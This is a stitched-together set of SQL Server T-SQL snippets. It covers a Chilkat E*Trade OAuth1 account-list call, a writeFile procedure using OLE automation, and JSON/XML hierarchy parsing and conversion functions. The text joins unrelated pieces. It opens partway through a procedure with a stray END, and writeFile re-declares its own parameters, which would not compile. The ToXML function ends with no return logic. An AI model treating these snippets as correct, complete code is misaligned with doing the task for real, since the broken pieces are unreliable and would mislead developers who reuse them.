    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @http, 'OAuth1', 1
    EXEC sp_OASetProperty @http, 'OAuthVerifier', ''
    EXEC sp_OASetProperty @http, 'OAuthConsumerKey', 'ETRADE_CONSUMER_KEY'
    EXEC sp_OASetProperty @http, 'OAuthConsumerSecret', 'ETRADE_CONSUMER_SECRET'

    -- Load the access token previously obtained via the OAuth1 3-Legged Authorization examples Step1 and Step2.
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT

    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/tokens/etrade.json'
    IF @success <> 1
      BEGIN

        PRINT 'Failed to load OAuth1 token'
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'oauth_token'
    EXEC sp_OASetProperty @http, 'OAuthToken', @sTmp0
    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'oauth_token_secret'
    EXEC sp_OASetProperty @http, 'OAuthTokenSecret', @sTmp0

    -- See the ETrade v1 API documentation HERE.

    DECLARE @respStr nvarchar(4000)
    EXEC sp_OAMethod @http, 'QuickGetStr', @respStr OUT, 'https://apisb.etrade.com/v1/accounts/list'
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    -- A 200 status code indicates success.
    DECLARE @statusCode int
    EXEC sp_OAGetProperty @http, 'LastStatus', @statusCode OUT

    PRINT 'statusCode = ' + @statusCode

    -- Use the following online tool to generate parsing code from sample XML: 
    -- Generate Parsing Code from XML

    -- A sample XML response is shown below...

    DECLARE @xml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @xml OUT

    EXEC sp_OAMethod @xml, 'LoadXml', @success OUT, @respStr
    DECLARE @i int
    DECLARE @count_i int
    DECLARE @tagPath nvarchar(4000)
    DECLARE @accountId int
    DECLARE @accountIdKey nvarchar(4000)
    DECLARE @accountMode nvarchar(4000)
    DECLARE @accountDesc nvarchar(4000)
    DECLARE @accountName nvarchar(4000)
    DECLARE @accountType nvarchar(4000)
    DECLARE @institutionType nvarchar(4000)
    DECLARE @accountStatus nvarchar(4000)
    DECLARE @closedDate int

    SELECT @i = 0
    EXEC sp_OAMethod @xml, 'NumChildrenHavingTag', @count_i OUT, 'Accounts|Account'
    WHILE @i < @count_i
      BEGIN
        EXEC sp_OASetProperty @xml, 'I', @i
        EXEC sp_OAMethod @xml, 'GetChildIntValue', @accountId OUT, 'Accounts|Account[i]|accountId'
        EXEC sp_OAMethod @xml, 'GetChildContent', @accountIdKey OUT, 'Accounts|Account[i]|accountIdKey'
        EXEC sp_OAMethod @xml, 'GetChildContent', @accountMode OUT, 'Accounts|Account[i]|accountMode'
        EXEC sp_OAMethod @xml, 'GetChildContent', @accountDesc OUT, 'Accounts|Account[i]|accountDesc'
        EXEC sp_OAMethod @xml, 'GetChildContent', @accountName OUT, 'Accounts|Account[i]|accountName'
        EXEC sp_OAMethod @xml, 'GetChildContent', @accountType OUT, 'Accounts|Account[i]|accountType'
        EXEC sp_OAMethod @xml, 'GetChildContent', @institutionType OUT, 'Accounts|Account[i]|institutionType'
        EXEC sp_OAMethod @xml, 'GetChildContent', @accountStatus OUT, 'Accounts|Account[i]|accountStatus'
        EXEC sp_OAMethod @xml, 'GetChildIntValue', @closedDate OUT, 'Accounts|Account[i]|closedDate'
        SELECT @i = @i + 1
      END

    -- <?xml version="1.0" encoding="UTF-8"?>
    -- <AccountListResponse>
    --    <Accounts>
    --       <Account>
    --          <accountId>84010429</accountId>
    --          <accountIdKey>JIdOIAcSpwR1Jva7RQBraQ</accountIdKey>
    --          <accountMode>MARGIN</accountMode>
    --          <accountDesc>INDIVIDUAL</accountDesc>
    --          <accountName>Individual Brokerage</accountName>
    --          <accountType>INDIVIDUAL</accountType>
    --          <institutionType>BROKERAGE</institutionType>
    --          <accountStatus>ACTIVE</accountStatus>
    --          <closedDate>0</closedDate>
    --       </Account>
    --       <Account>
    --          <accountId>84010430</accountId>
    --          <accountIdKey>JAAOIAcSpwR1Jva7RQBraQ</accountIdKey>
    --          <accountMode>MARGIN</accountMode>
    --          <accountDesc>INDIVIDUAL</accountDesc>
    --          <accountName>Individual Brokerage</accountName>
    --          <accountType>INDIVIDUAL</accountType>
    --          <institutionType>BROKERAGE</institutionType>
    --          <accountStatus>ACTIVE</accountStatus>
    --          <closedDate>0</closedDate>
    --       </Account>
    --    </Accounts>
    -- </AccountListResponse>

    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @json
    EXEC @hr = sp_OADestroy @xml


END
GO


writeFile


CREATE PROCEDURE writeFile
 (
     @fileName NVARCHAR(MAX),
     @fileContents NVARCHAR(MAX)
 )
 AS
 BEGIN
     DECLARE @OLE            INT 
     DECLARE @FileID         INT 
     DECLARE @outputCursor as CURSOR;
     DECLARE @outputLine as NVARCHAR(MAX);
     DECLARE @fileName as NVARCHAR(MAX);
     DECLARE @fileContents as NVARCHAR(MAX);
 
print 'about to write file';
print @fileName;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT 
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', 
                    @FileID OUT, @fileName, 2, 1 
 
DECLARE @sep char(2);
 
SET @sep = char(13) + char(10);
 
SET @outputCursor = CURSOR FOR
 
WITH splitter_cte AS (
  SELECT CAST(CHARINDEX(@sep, @fileContents) as BIGINT) as pos, 
         CAST(0 as BIGINT) as lastPos
  UNION ALL
  SELECT CHARINDEX(@sep, @fileContents, pos + 1), pos
  FROM splitter_cte
  WHERE pos > 0
)
SELECT SUBSTRING(@fileContents, lastPos + 1,
                 case when pos = 0 then 999999999
                 else pos - lastPos -1 end + 1) as chunk
FROM splitter_cte
ORDER BY lastPos
OPTION (MAXRECURSION 0);
 
--DECLARE @loopCounter as BIGINT = 0;
OPEN @outputCursor;
FETCH NEXT FROM @outputCursor INTO @outputLine ;
WHILE @@FETCH_STATUS = 0
BEGIN
    --set @loopCounter  = @loopCounter  + 1;
    EXECUTE sp_OAMethod @FileID, 'Write', Null, @outputLine;
    --PRINT concat(@loopCounter, ': ', @outputLine);
    FETCH NEXT FROM @outputCursor INTO @outputLine ;
END
CLOSE @outputCursor;
DEALLOCATE @outputCursor;
 
EXECUTE sp_OADestroy @FileID;
END

-- Replace C:\SQL_DATA\test.txt with your output file. The directory must exist and the account that SQL Server is running as will need permissions to write there.
EXEC writeFile @fileName = 'C:\SQL_DATA\test.txt', 
               @fileContents = 'this is a test
some more text
go
go
even more';


DECLARE @myOutputString varchar(max)

set @myOutputString = 'this is a test
some more text
go
go
even more'

EXEC writeFile @fileName = 'C:\SQL_DATA\test.txt',
@fileContents = @myOutputString
select @myOutputString ;



IF OBJECT_ID (N'dbo.parseJSON') IS NOT NULL
   DROP FUNCTION dbo.parseJSON

GO
IF OBJECT_ID (N'dbo.ParseXML') IS NOT NULL
   DROP FUNCTION dbo.ParseXML
GO

IF OBJECT_ID (N'dbo.ToJSON') IS NOT NULL
   DROP FUNCTION dbo.ToJSON
GO

IF OBJECT_ID (N'dbo.ToXML') IS NOT NULL
   DROP FUNCTION dbo.ToXML
GO

IF OBJECT_ID (N'dbo.JSONEscaped') IS NOT NULL
   DROP FUNCTION dbo.JSONEscaped
GO
IF EXISTS (SELECT * FROM sys.types WHERE name LIKE 'Hierarchy')
  DROP TYPE dbo.Hierarchy
go
CREATE TYPE dbo.Hierarchy AS TABLE
/*Markup languages such as JSON and XML all represent object data as hierarchies. Although it looks very different to the entity-relational model, it isn't. It is rather more a different perspective on the same model. The first trick is to represent it as a Adjacency list hierarchy in a table, and then use the contents of this table to update the database. This Adjacency list is really the Database equivalent of any of the nested data structures that are used for the interchange of serialized information with the application, and can be used to create XML, OSX Property lists, Python nested structures or YAML as easily as JSON.

Adjacency list tables have the same structure whatever the data in them. This means that you can define a single Table-Valued  Type and pass data structures around between stored procedures. However, they are best held at arms-length from the data, since they are not relational tables, but something more like the dreaded EAV (Entity-Attribute-Value) tables. Converting the data from its Hierarchical table form will be different for each application, but is easy with a CTE. You can, alternatively, convert the hierarchical table into XML and interrogate that with XQuery
*/
(
   element_id INT primary key, /* internal surrogate primary key gives the order of parsing and the list order */
   sequenceNo [int] NULL, /* the place in the sequence for the element */
   parent_ID INT,/* if the element has a parent then it is in this column. The document is the ultimate parent, so you can get the structure from recursing from the document */
   Object_ID INT,/* each list or object has an object id. This ties all elements to a parent. Lists are treated as objects here */
   NAME NVARCHAR(2000),/* the name of the object, null if it hasn't got one */
   StringValue NVARCHAR(MAX) NOT NULL,/*the string representation of the value of the element. */
   ValueType VARCHAR(10) NOT null /* the declared type of the value represented as a string in StringValue*/
)
go

CREATE FUNCTION dbo.JSONEscaped ( /* this is a simple utility function that takes a SQL String with all its clobber and outputs it as a sting with all the JSON escape sequences in it.*/
  @Unescaped NVARCHAR(MAX) --a string with maybe characters that will break json
  )
RETURNS NVARCHAR(MAX)
AS 
BEGIN
  SELECT  @Unescaped = REPLACE(@Unescaped, FROMString, TOString)
  FROM    (SELECT
            '\"' AS FromString, '"' AS ToString
           UNION ALL SELECT '\', '\\'
           UNION ALL SELECT '/', '\/'
           UNION ALL SELECT  CHAR(08),'\b'
           UNION ALL SELECT  CHAR(12),'\f'
           UNION ALL SELECT  CHAR(10),'\n'
           UNION ALL SELECT  CHAR(13),'\r'
           UNION ALL SELECT  CHAR(09),'\t'
          ) substitutions
RETURN @Unescaped
END

GO



CREATE FUNCTION ToJSON
(
      @Hierarchy Hierarchy READONLY
)

/*
the function that takes a Hierarchy table and converts it to a JSON string

example:

Declare @XMLSample XML
Select @XMLSample='
  <glossary><title>example glossary</title>
  <GlossDiv><title>S</title>
   <GlossList>
    <GlossEntry ID="SGML" SortAs="SGML">
     <GlossTerm>Standard Generalized Markup Language</GlossTerm>
     <Acronym>SGML</Acronym>
     <Abbrev>ISO 8879:1986</Abbrev>
     <GlossDef>
      <para>A meta-markup language, used to create markup languages such as DocBook.</para>
      <GlossSeeAlso OtherTerm="GML" />
      <GlossSeeAlso OtherTerm="XML" />
     </GlossDef>
     <GlossSee OtherTerm="markup" />
    </GlossEntry>
   </GlossList>
  </GlossDiv>
 </glossary>'

DECLARE @MyHierarchy Hierarchy -- to pass the hierarchy table around
insert into @MyHierarchy select * from dbo.ParseXML(@XMLSample)
SELECT dbo.ToJSON(@MyHierarchy)

	*/
RETURNS NVARCHAR(MAX)--JSON documents are always unicode.
AS
BEGIN
  DECLARE
    @JSON NVARCHAR(MAX),
    @NewJSON NVARCHAR(MAX),
    @Where INT,
    @ANumber INT,
    @notNumber INT,
    @indent INT,
    @ii int,
    @CrLf CHAR(2)--just a simple utility to save typing!
      
  --firstly get the root token into place 
  SELECT @CrLf=CHAR(13)+CHAR(10),--just CHAR(10) in UNIX
         @JSON = CASE ValueType WHEN 'array' THEN 
         +COALESCE('{'+@CrLf+'  "'+NAME+'" : ','')+'[' 
         ELSE '{' END
            +@CrLf
            + case when ValueType='array' and NAME is not null then '  ' else '' end
            + '@Object'+CONVERT(VARCHAR(5),OBJECT_ID)
            +@CrLf+CASE ValueType WHEN 'array' THEN
            case when NAME is null then ']' else '  ]'+@CrLf+'}'+@CrLf end
                ELSE '}' END
  FROM @Hierarchy 
    WHERE parent_id IS NULL AND valueType IN ('object','document','array') --get the root element
/* now we simply iterat from the root token growing each branch and leaf in each iteration. This won't be enormously quick, but it is simple to do. All values, or name/value pairs withing a structure can be created in one SQL Statement*/
  Select @ii=1000
  WHILE @ii>0
    begin
    SELECT @where= PATINDEX('%[^[a-zA-Z0-9]@Object%',@json)--find NEXT token
    if @where=0 BREAK
    /* this is slightly painful. we get the indent of the object we've found by looking backwards up the string */ 
    SET @indent=CHARINDEX(char(10)+char(13),Reverse(LEFT(@json,@where))+char(10)+char(13))-1
    SET @NotNumber= PATINDEX('%[^0-9]%', RIGHT(@json,LEN(@JSON+'|')-@Where-8)+' ')--find NEXT token
    SET @NewJSON=NULL --this contains the structure in its JSON form
    SELECT  
        @NewJSON=COALESCE(@NewJSON+','+@CrLf+SPACE(@indent),'')
        +case when parent.ValueType='array' then '' else COALESCE('"'+TheRow.NAME+'" : ','') end
        +CASE TheRow.valuetype 
        WHEN 'array' THEN '  ['+@CrLf+SPACE(@indent+2)
           +'@Object'+CONVERT(VARCHAR(5),TheRow.[OBJECT_ID])+@CrLf+SPACE(@indent+2)+']' 
        WHEN 'object' then '  {'+@CrLf+SPACE(@indent+2)
           +'@Object'+CONVERT(VARCHAR(5),TheRow.[OBJECT_ID])+@CrLf+SPACE(@indent+2)+'}'
        WHEN 'string' THEN '"'+dbo.JSONEscaped(TheRow.StringValue)+'"'
        ELSE TheRow.StringValue
       END 
     FROM @Hierarchy TheRow 
     inner join @hierarchy Parent
     on parent.element_ID=TheRow.parent_ID
      WHERE TheRow.parent_id= SUBSTRING(@JSON,@where+8, @Notnumber-1)
     /* basically, we just lookup the structure based on the ID that is appended to the @Object token. Simple eh? */
    --now we replace the token with the structure, maybe with more tokens in it.
    Select @JSON=STUFF (@JSON, @where+1, 8+@NotNumber-1, @NewJSON),@ii=@ii-1
    end
  return @JSON
end
go

CREATE FUNCTION dbo.ParseXML( @XML_Result XML)
/* 
Returns a hierarchy table from an XML document.
Author: Phil Factor
Revision: 1.2
date: 1 May 2014
example:

DECLARE @MyHierarchy Hierarchy
INSERT INTO @myHierarchy
select * from dbo.ParseXML((Select * from adventureworks.person.contact where contactID in (123,124,125) FOR XML path('contact'), root('contacts')))
SELECT dbo.ToJSON(@MyHierarchy)

DECLARE @MyHierarchy Hierarchy
INSERT INTO @myHierarchy
select * from dbo.ParseXML('<root><CSV><item Year="1997" Make="Ford" Model="E350" Description="ac, abs, moon" Price="3000.00" /><item Year="1999" Make="Chevy" Model="Venture &quot;Extended Edition&quot;" Description="" Price="4900.00" /><item Year="1999" Make="Chevy" Model="Venture &quot;Extended Edition, Very Large&quot;" Description="" Price="5000.00" /><item Year="1996" Make="Jeep" Model="Grand Cherokee" Description="MUST SELL!&#xD;&#xA;air, moon roof, loaded" Price="4799.00" /></CSV></root>')
SELECT dbo.ToJSON(@MyHierarchy)

*/
RETURNS @Hierarchy TABLE
 (
    Element_ID INT PRIMARY KEY, /* internal surrogate primary key gives the order of parsing and the list order */
    SequenceNo INT NULL, /* the sequence number in a list */
    Parent_ID INT,/* if the element has a parent then it is in this column. The document is the ultimate parent, so you can get the structure from recursing from the document */
    [Object_ID] INT,/* each list or object has an object id. This ties all elements to a parent. Lists are treated as objects here */
    [Name] NVARCHAR(2000),/* the name of the object */
    StringValue NVARCHAR(MAX) NOT NULL,/*the string representation of the value of the element. */
    ValueType VARCHAR(10) NOT NULL /* the declared type of the value represented as a string in StringValue*/
 )
   AS 
 BEGIN
 DECLARE  @Insertions TABLE(
     Element_ID INT IDENTITY PRIMARY KEY,
     SequenceNo INT,
     TheLevel INT,
     Parent_ID INT,
     [Object_ID] INT,
     [Name] VARCHAR(50),
     StringValue VARCHAR(MAX),
     ValueType VARCHAR(10),
     TheNextLevel XML,
     ThisLevel XML)
     
 DECLARE @RowCount INT, @ii INT
 --get the 
 INSERT INTO @Insertions (TheLevel, Parent_ID, [Object_ID], [Name], StringValue, SequenceNo, TheNextLevel, ThisLevel)
  SELECT   1 AS TheLevel, NULL AS Parent_ID, NULL AS [Object_ID], 
    FirstLevel.value('local-name(.)', 'varchar(255)') AS [Name], --the name of the element
    FirstLevel.value('text()[1]','varchar(max)') AS StringValue,-- its value as a string
    ROW_NUMBER() OVER(ORDER BY (SELECT 1)) AS SequenceNo,--the 'child number' (simple number here)
    FirstLevel.query('*'), --The 'inner XML' of the current child  
    FirstLevel.query('.')  --the XML of the parent
  FROM @XML_Result.nodes('/*') a(FirstLevel) --get all nodes from the XML
 SELECT @RowCount=@@RowCount
 SELECT @ii=2
 WHILE @RowCount>0 --while loop to avoid recursion.
  BEGIN
  INSERT INTO @Insertions (TheLevel, Parent_ID, [Object_ID], [Name], StringValue, SequenceNo, TheNextLevel, ThisLevel)
   SELECT --all the elements first
   @ii AS TheLevel,
     a.Element_ID,
     NULL,
     [then].value('local-name(.)', 'varchar(255)'),
     [then].value('text()[1]','varchar(max)'),
     ROW_NUMBER() OVER(PARTITION BY a.Element_ID ORDER BY (SELECT 1)),
     [then].query('*'),
     [then].query('.')
   FROM   @Insertions a
     CROSS apply a.TheNextLevel.nodes('*') whatsNext([then])
   WHERE a.TheLevel = @ii - 1 
  UNION ALL -- to pick out the attributes of the preceding level
  SELECT @ii AS TheLevel,
     a.Element_ID,
     NULL,
     [then].value('local-name(.)', 'varchar(255)') AS [name],
     [then].value('.','varchar(max)') AS [value],
     ROW_NUMBER() OVER(PARTITION BY a.Element_ID 
    ORDER BY (
    SELECT 1)),
   '' , ''
   FROM   @Insertions a  
     CROSS apply a.ThisLevel.nodes('/*/@*') whatsNext([then])
   WHERE a.TheLevel = @ii - 1 OPTION (RECOMPILE)
  SELECT @RowCount=@@ROWCOUNT
  SELECT @ii=@ii+1
  END;
  --roughly type the datatypes (no XSD available here) 
 UPDATE @Insertions SET
    [Object_ID]=CASE WHEN StringValue IS NULL THEN Element_ID 
  ELSE NULL END,
    ValueType = CASE
     WHEN StringValue IS NULL THEN 'object'
     WHEN  LEN(StringValue)=0 THEN 'string'
     WHEN StringValue LIKE '%[^0-9.-]%' THEN 'string'
     WHEN StringValue LIKE '[0-9]' THEN 'int'
     WHEN RIGHT(StringValue, LEN(StringValue)-1) LIKE'%[^0-9.]%' THEN 'string'
     WHEN  StringValue LIKE'%[0-9][.][0-9]%' THEN 'real'
     WHEN StringValue LIKE '%[^0-9]%' THEN 'string'
  ELSE 'int' END--and find the arrays
 UPDATE @Insertions SET
    ValueType='array'
  WHERE Element_ID IN(
  SELECT candidates.Parent_ID 
   FROM
   (
   SELECT Parent_ID, COUNT(*) AS SameName 
    FROM @Insertions
    GROUP BY [Name],Parent_ID 
    HAVING COUNT(*)>1) candidates
     INNER JOIN  @Insertions insertions
     ON candidates.Parent_ID= insertions.Parent_ID
   GROUP BY candidates.Parent_ID 
   HAVING COUNT(*)=MIN(SameName))
 INSERT INTO @Hierarchy (Element_ID,SequenceNo, Parent_ID, [Object_ID], [Name], StringValue,ValueType)
  SELECT Element_ID, SequenceNo, Parent_ID, [Object_ID], [Name], COALESCE(StringValue,''), ValueType
  FROM @Insertions
 RETURN
 END

GO

CREATE FUNCTION dbo.parseJSON( @JSON NVARCHAR(MAX))
RETURNS @hierarchy TABLE
  (
   element_id INT IDENTITY(1, 1) NOT NULL, /* internal surrogate primary key gives the order of parsing and the list order */
   sequenceNo [int] NULL, /* the place in the sequence for the element */
   parent_ID INT,/* if the element has a parent then it is in this column. The document is the ultimate parent, so you can get the structure from recursing from the document */
   Object_ID INT,/* each list or object has an object id. This ties all elements to a parent. Lists are treated as objects here */
   NAME NVARCHAR(2000),/* the name of the object */
   StringValue NVARCHAR(MAX) NOT NULL,/*the string representation of the value of the element. */
   ValueType VARCHAR(10) NOT null /* the declared type of the value represented as a string in StringValue*/
  )
AS
BEGIN
  DECLARE
    @FirstObject INT, --the index of the first open bracket found in the JSON string
    @OpenDelimiter INT,--the index of the next open bracket found in the JSON string
    @NextOpenDelimiter INT,--the index of subsequent open bracket found in the JSON string
    @NextCloseDelimiter INT,--the index of subsequent close bracket found in the JSON string
    @Type NVARCHAR(10),--whether it denotes an object or an array
    @NextCloseDelimiterChar CHAR(1),--either a '}' or a ']'
    @Contents NVARCHAR(MAX), --the unparsed contents of the bracketed expression
    @Start INT, --index of the start of the token that you are parsing
    @end INT,--index of the end of the token that you are parsing
    @param INT,--the parameter at the end of the next Object/Array token
    @EndOfName INT,--the index of the start of the parameter at end of Object/Array token
    @token NVARCHAR(200),--either a string or object
    @value NVARCHAR(MAX), -- the value as a string
    @SequenceNo int, -- the sequence number within a list
    @name NVARCHAR(200), --the name as a string
    @parent_ID INT,--the next parent ID to allocate
    @lenJSON INT,--the current length of the JSON String
    @characters NCHAR(36),--used to convert hex to decimal
    @result BIGINT,--the value of the hex symbol being parsed
    @index SMALLINT,--used for parsing the hex value
    @Escape INT --the index of the next escape character
    

  DECLARE @Strings TABLE /* in this temporary table we keep all strings, even the names of the elements, since they are 'escaped' in a different way, and may contain, unescaped, brackets denoting objects or lists. These are replaced in the JSON string by tokens representing the string */
    (
     String_ID INT IDENTITY(1, 1),
     StringValue NVARCHAR(MAX)
    )
  SELECT--initialise the characters to convert hex to ascii
    @characters='0123456789abcdefghijklmnopqrstuvwxyz',
    @SequenceNo=0, --set the sequence no. to something sensible.
  /* firstly we process all strings. This is done because [{} and ] aren't escaped in strings, which complicates an iterative parse. */
    @parent_ID=0;
  WHILE 1=1 --forever until there is nothing more to do
    BEGIN
      SELECT
        @start=PATINDEX('%[^a-zA-Z]["]%', @json collate SQL_Latin1_General_CP850_Bin);--next delimited string
      IF @start=0 BREAK --no more so drop through the WHILE loop
      IF SUBSTRING(@json, @start+1, 1)='"' 
        BEGIN --Delimited Name
          SET @start=@Start+1;
          SET @end=PATINDEX('%[^\]["]%', RIGHT(@json, LEN(@json+'|')-@start) collate SQL_Latin1_General_CP850_Bin);
        END
      IF @end=0 --no end delimiter to last string
        BREAK --no more
      SELECT @token=SUBSTRING(@json, @start+1, @end-1)
      --now put in the escaped control characters
      SELECT @token=REPLACE(@token, FROMString, TOString)
      FROM
        (SELECT
          '\"' AS FromString, '"' AS ToString
         UNION ALL SELECT '\\', '\'
         UNION ALL SELECT '\/', '/'
         UNION ALL SELECT '\b', CHAR(08)
         UNION ALL SELECT '\f', CHAR(12)
         UNION ALL SELECT '\n', CHAR(10)
         UNION ALL SELECT '\r', CHAR(13)
         UNION ALL SELECT '\t', CHAR(09)
        ) substitutions
      SELECT @result=0, @escape=1
  --Begin to take out any hex escape codes
      WHILE @escape>0
        BEGIN
          SELECT @index=0,
          --find the next hex escape sequence
          @escape=PATINDEX('%\x[0-9a-f][0-9a-f][0-9a-f][0-9a-f]%', @token collate SQL_Latin1_General_CP850_Bin)
          IF @escape>0 --if there is one
            BEGIN
              WHILE @index<4 --there are always four digits to a \x sequence   
                BEGIN 
                  SELECT --determine its value
                    @result=@result+POWER(16, @index)
                    *(CHARINDEX(SUBSTRING(@token, @escape+2+3-@index, 1),
                                @characters)-1), @index=@index+1 ;
         
                END
                -- and replace the hex sequence by its unicode value
              SELECT @token=STUFF(@token, @escape, 6, NCHAR(@result))
            END
        END
      --now store the string away 
      INSERT INTO @Strings (StringValue) SELECT @token
      -- and replace the string with a token
      SELECT @JSON=STUFF(@json, @start, @end+1,
                    '@string'+CONVERT(NVARCHAR(5), @@identity))
    END
  -- all strings are now removed. Now we find the first leaf.  
  WHILE 1=1  --forever until there is nothing more to do
  BEGIN

  SELECT @parent_ID=@parent_ID+1
  --find the first object or list by looking for the open bracket
  SELECT @FirstObject=PATINDEX('%[{[[]%', @json collate SQL_Latin1_General_CP850_Bin)--object or array
  IF @FirstObject = 0 BREAK
  IF (SUBSTRING(@json, @FirstObject, 1)='{') 
    SELECT @NextCloseDelimiterChar='}', @type='object'
  ELSE 
    SELECT @NextCloseDelimiterChar=']', @type='array'
  SELECT @OpenDelimiter=@firstObject

  WHILE 1=1 --find the innermost object or list...
    BEGIN
      SELECT
        @lenJSON=LEN(@JSON+'|')-1
  --find the matching close-delimiter proceeding after the open-delimiter
      SELECT
        @NextCloseDelimiter=CHARINDEX(@NextCloseDelimiterChar, @json,
                                      @OpenDelimiter+1)
  --is there an intervening open-delimiter of either type
      SELECT @NextOpenDelimiter=PATINDEX('%[{[[]%',
             RIGHT(@json, @lenJSON-@OpenDelimiter)collate SQL_Latin1_General_CP850_Bin)--object
      IF @NextOpenDelimiter=0 
        BREAK
      SELECT @NextOpenDelimiter=@NextOpenDelimiter+@OpenDelimiter
      IF @NextCloseDelimiter<@NextOpenDelimiter 
        BREAK
      IF SUBSTRING(@json, @NextOpenDelimiter, 1)='{' 
        SELECT @NextCloseDelimiterChar='}', @type='object'
      ELSE 
        SELECT @NextCloseDelimiterChar=']', @type='array'
      SELECT @OpenDelimiter=@NextOpenDelimiter
    END
  ---and parse out the list or name/value pairs
  SELECT
    @contents=SUBSTRING(@json, @OpenDelimiter+1,
                        @NextCloseDelimiter-@OpenDelimiter-1)
  SELECT
    @JSON=STUFF(@json, @OpenDelimiter,
                @NextCloseDelimiter-@OpenDelimiter+1,
                '@'+@type+CONVERT(NVARCHAR(5), @parent_ID))
  WHILE (PATINDEX('%[A-Za-z0-9@+.e]%', @contents collate SQL_Latin1_General_CP850_Bin))<>0 
    BEGIN
      IF @Type='Object' --it will be a 0-n list containing a string followed by a string, number,boolean, or null
        BEGIN
          SELECT
            @SequenceNo=0,@end=CHARINDEX(':', ' '+@contents)--if there is anything, it will be a string-based name.
          SELECT  @start=PATINDEX('%[^A-Za-z@][@]%', ' '+@contents collate SQL_Latin1_General_CP850_Bin)--AAAAAAAA
          SELECT @token=SUBSTRING(' '+@contents, @start+1, @End-@Start-1),
            @endofname=PATINDEX('%[0-9]%', @token collate SQL_Latin1_General_CP850_Bin),
            @param=RIGHT(@token, LEN(@token)-@endofname+1)
          SELECT
            @token=LEFT(@token, @endofname-1),
            @Contents=RIGHT(' '+@contents, LEN(' '+@contents+'|')-@end-1)
          SELECT  @name=stringvalue FROM @strings
            WHERE string_id=@param --fetch the name
        END
      ELSE 
        SELECT @Name=null,@SequenceNo=@SequenceNo+1 
      SELECT
        @end=CHARINDEX(',', @contents)-- a string-token, object-token, list-token, number,boolean, or null
      IF @end=0 
        SELECT  @end=PATINDEX('%[A-Za-z0-9@+.e][^A-Za-z0-9@+.e]%', @Contents+' ' collate SQL_Latin1_General_CP850_Bin)
          +1
       SELECT
        @start=PATINDEX('%[^A-Za-z0-9@+.e][A-Za-z0-9@+.e]%', ' '+@contents collate SQL_Latin1_General_CP850_Bin)
      --select @start,@end, LEN(@contents+'|'), @contents  
      SELECT
        @Value=RTRIM(SUBSTRING(@contents, @start, @End-@Start)),
        @Contents=RIGHT(@contents+' ', LEN(@contents+'|')-@end)
      IF SUBSTRING(@value, 1, 7)='@object' 
        INSERT INTO @hierarchy
          (NAME, SequenceNo, parent_ID, StringValue, Object_ID, ValueType)
          SELECT @name, @SequenceNo, @parent_ID, SUBSTRING(@value, 8, 5),
            SUBSTRING(@value, 8, 5), 'object' 
      ELSE 
        IF SUBSTRING(@value, 1, 6)='@array' 
          INSERT INTO @hierarchy
            (NAME, SequenceNo, parent_ID, StringValue, Object_ID, ValueType)
            SELECT @name, @SequenceNo, @parent_ID, SUBSTRING(@value, 7, 5),
              SUBSTRING(@value, 7, 5), 'array' 
        ELSE 
          IF SUBSTRING(@value, 1, 7)='@string' 
            INSERT INTO @hierarchy
              (NAME, SequenceNo, parent_ID, StringValue, ValueType)
              SELECT @name, @SequenceNo, @parent_ID, stringvalue, 'string'
              FROM @strings
              WHERE string_id=SUBSTRING(@value, 8, 5)
          ELSE 
            IF @value IN ('true', 'false') 
              INSERT INTO @hierarchy
                (NAME, SequenceNo, parent_ID, StringValue, ValueType)
                SELECT @name, @SequenceNo, @parent_ID, @value, 'boolean'
            ELSE 
              IF @value='null' 
                INSERT INTO @hierarchy
                  (NAME, SequenceNo, parent_ID, StringValue, ValueType)
                  SELECT @name, @SequenceNo, @parent_ID, @value, 'null'
              ELSE 
                IF PATINDEX('%[^0-9]%', @value collate SQL_Latin1_General_CP850_Bin)>0 
                  INSERT INTO @hierarchy
                    (NAME, SequenceNo, parent_ID, StringValue, ValueType)
                    SELECT @name, @SequenceNo, @parent_ID, @value, 'real'
                ELSE 
                  INSERT INTO @hierarchy
                    (NAME, SequenceNo, parent_ID, StringValue, ValueType)
                    SELECT @name, @SequenceNo, @parent_ID, @value, 'int'
      if @Contents=' ' Select @SequenceNo=0
    END
  END
INSERT INTO @hierarchy (NAME, SequenceNo, parent_ID, StringValue, Object_ID, ValueType)
  SELECT '-',1, NULL, '', @parent_id-1, @type
--
   RETURN
END
GO


CREATE FUNCTION ToXML
(
/*this function converts a JSONhierarchy table into an XML document. This uses the same technique as the toJSON function, and uses the 'entities' form of XML syntax to give a compact rendering of the structure */
      @Hierarchy Hierarchy READONLY
)
RETURNS NVARCHAR(MAX)--use unicode.
AS
BEGIN
  DECLARE
    @XMLAsString NVARCHAR(MAX),
    @NewXML NVARCHAR(MAX),
    @Entities NVARCHAR(MAX),
    @Objects NVARCHAR(MAX),
    @Name NVARCHAR(200),
    @Where INT,
    @ANumber INT,
    @notNumber INT,
    @indent INT,
    @CrLf CHAR(2)--just a simple utility to save typing!
     
  --firstly get the root token into place
  --firstly get the root token into place
  SELECT @CrLf=CHAR(13)+CHAR(10),--just CHAR(10) in UNIX
         @XMLasString ='<?xml version="1.0" ?>
@Object'+CONVERT(VARCHAR(5),OBJECT_ID)+'
'
    FROM @hierarchy
    WHERE parent_id IS NULL AND valueType IN ('object','array') --get the root element
